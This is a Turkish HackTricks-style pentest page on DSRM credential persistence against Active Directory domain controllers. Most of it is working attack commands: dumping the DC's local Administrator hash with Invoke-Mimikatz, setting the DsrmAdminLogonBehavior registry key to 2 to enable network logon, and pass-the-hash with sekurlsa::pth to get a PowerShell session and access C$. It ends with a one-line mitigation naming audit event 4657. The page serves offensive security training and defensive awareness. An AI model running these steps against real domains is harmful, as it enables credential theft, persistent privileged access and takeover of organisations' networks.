{{#include ../../banners/hacktricks-training.md}}

# DSRM Kimlik Bilgileri

Her **DC** içinde bir **yerel yönetici** hesabı vardır. Bu makinede yönetici ayrıcalıklarına sahip olduğunuzda, mimikatz kullanarak **yerel Yönetici hash'ini dökebilirsiniz**. Ardından, bu şifreyi **etkinleştirmek** için bir kayıt defterini değiştirerek bu yerel Yönetici kullanıcısına uzaktan erişim sağlayabilirsiniz.\
Öncelikle, DC içindeki **yerel Yönetici** kullanıcısının **hash'ini dökmemiz** gerekiyor:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Sonra, bu hesabın çalışıp çalışmadığını kontrol etmemiz gerekiyor ve eğer kayıt defteri anahtarı "0" değerine sahipse veya yoksa, **"2" olarak ayarlamanız gerekiyor**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Daha sonra, bir PTH kullanarak **C$ içeriğini listeleyebilir veya hatta bir shell elde edebilirsiniz**. Bu hash ile bellek içinde yeni bir powershell oturumu oluşturmak için (PTH için) **kullanılan "domain" sadece DC makinesinin adıdır:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Daha fazla bilgi için: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) ve [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Azaltma

- Olay ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` denetim oluşturma/değiştirme
